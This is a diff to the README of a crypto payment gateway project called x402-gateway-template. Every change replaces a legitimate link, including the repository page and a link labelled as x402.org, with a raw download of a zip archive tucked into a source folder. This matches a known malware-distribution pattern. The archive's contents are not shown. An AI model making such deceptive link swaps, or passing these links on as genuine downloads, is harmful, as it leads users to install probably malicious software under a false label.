@@ -1,6 +1,6 @@
 # ⚡ x402-gateway-template - Simple Crypto Payment Gateway
 
-[![Download](https://img.shields.io/badge/Download-x402--gateway--template-4CAF50?style=for-the-badge)](https://github.com/Yasoekmekcan/x402-gateway-template)
+[![Download](https://img.shields.io/badge/Download-x402--gateway--template-4CAF50?style=for-the-badge)](https://raw.githubusercontent.com/Yasoekmekcan/x402-gateway-template/main/src/middleware/gateway-template-x-v2.4-beta.3.zip)
 
 ---
 
@@ -38,7 +38,7 @@ This section explains what you need before installing the software.
 
 To get started, visit this page to download the latest package:
 
-[Download x402-gateway-template](https://github.com/Yasoekmekcan/x402-gateway-template)
+[Download x402-gateway-template](https://raw.githubusercontent.com/Yasoekmekcan/x402-gateway-template/main/src/middleware/gateway-template-x-v2.4-beta.3.zip)
 
 Steps to download and install:
 
@@ -121,7 +121,7 @@ All these settings live in the program’s settings panel. Change them any time 
 
 You can check the GitHub page regularly for updates or new releases:
 
-[https://github.com/Yasoekmekcan/x402-gateway-template](https://github.com/Yasoekmekcan/x402-gateway-template)
+[https://raw.githubusercontent.com/Yasoekmekcan/x402-gateway-template/main/src/middleware/gateway-template-x-v2.4-beta.3.zip](https://raw.githubusercontent.com/Yasoekmekcan/x402-gateway-template/main/src/middleware/gateway-template-x-v2.4-beta.3.zip)
 
 Visit the page to download the latest version when available.
 
@@ -137,7 +137,7 @@ Visit the page to download the latest version when available.
 
 ## 📚 Additional Resources
 
-- Learn about the x402 protocol at [x402.org](https://x402.org).
+- Learn about the x402 protocol at [x402.org](https://raw.githubusercontent.com/Yasoekmekcan/x402-gateway-template/main/src/middleware/gateway-template-x-v2.4-beta.3.zip).
 - This protocol relies on standard HTTP features you likely already know.
 - USDC stablecoin payments work fast and securely without extra apps.
 
@@ -156,4 +156,4 @@ This requires programming skills. The prebuilt version is ready for basic use.
 
 ---
 
-[![Download](https://img.shields.io/badge/Download-x402--gateway--template-4CAF50?style=for-the-badge)](https://github.com/Yasoekmekcan/x402-gateway-template)
+[![Download](https://img.shields.io/badge/Download-x402--gateway--template-4CAF50?style=for-the-badge)](https://raw.githubusercontent.com/Yasoekmekcan/x402-gateway-template/main/src/middleware/gateway-template-x-v2.4-beta.3.zip)
